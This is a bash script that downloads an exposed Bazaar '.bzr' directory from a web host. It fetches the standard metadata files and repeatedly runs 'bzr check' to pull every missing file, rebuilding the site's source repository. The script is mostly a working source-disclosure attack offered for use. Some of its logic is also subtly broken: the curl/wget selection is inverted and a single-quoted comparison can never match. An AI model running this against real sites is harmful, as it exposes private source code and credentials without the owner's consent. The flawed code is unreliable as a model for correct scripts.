#!/bin/bash

if [[ -z $1 ]]; then
    cat<<EOF
Usage:
    $0 hostname/directory
    (directory is optional)
Example:
    $0 www.example.com/images (would crawl http://example.com/images/.git/)
    $0 www.example.com (would crawl http://example.com/.git/)
EOF
exit 1
else
    #Parse out directories and build base url
    if [[ $1 =~ "/" ]] ; then
        HOST=${1%%/*}
        DIR=${1#*/}
    else
        HOST=$1
        DIR=""
    fi
    if [[ -e $DIR ]]; then
        BASEURL="http://${HOST}/"
    else
        BASEURL="http://${HOST}/${DIR}/"
    fi
fi

CURL_AVAILABLE=`which curl`
WGET_AVAILABLE=`which wget`
if [[ -z $CURL_AVAILABLE && -z $WGET_AVAILABLE ]]; then
    echo "Unable to find useable http client (need curl or wget)"
    exit 1
elif [ -e $WGET_AVAILABLE ]; then
    CRAWLER='curl'
else
    CRAWLER='wget'
fi

OFS=$IFS
export IFS="/"
DIR_COUNT=0
for word in $DIR; do
    let DIR_COUNT=$DIR_COUNT+1
done
export IFS=$OFS

# FUNCTIONS HERP DERP
function get {
    # Don't download files if they already exist
    if [ ! -e $1 ]; then
      echo "Getting $BASEURL$1"
      if [ '$CRAWLER' == 'wget' ]; then
          wget $BASEURL$1 -x -nH --cut-dirs=$DIR_COUNT
      else
          curl $BASEURL$1 -L -f -s -S --create-dirs -o $1
      fi
    fi
}

#####################

mkdir $HOST

#1 - get static files
cd $HOST
get '.bzr/branch-format'
get '.bzr/branch/branch.conf'
get '.bzr/branch/format'
get '.bzr/branch/last-revision'
get '.bzr/branch/tags'
get '.bzr/checkout/conflicts'
get '.bzr/checkout/dirstate'
get '.bzr/checkout/format'
get '.bzr/checkout/merge-hashes'
get '.bzr/checkout/views'
get '.bzr/repository/format'
get '.bzr/repository/pack-names'
get '.bzr/repository/'
cd ..

file="asdf"
while [ "$file" != "" ]
do
    cd $HOST
    file=`bzr check 2>&1|grep ERROR|head -1|awk '{print $6}'|sed "s/.*\(\.bzr\/.*\)':$/\1/"`
    if [ "$file" != "" ]; then
        echo "Getting $file"
        get $file
    fi
    cd ..
done
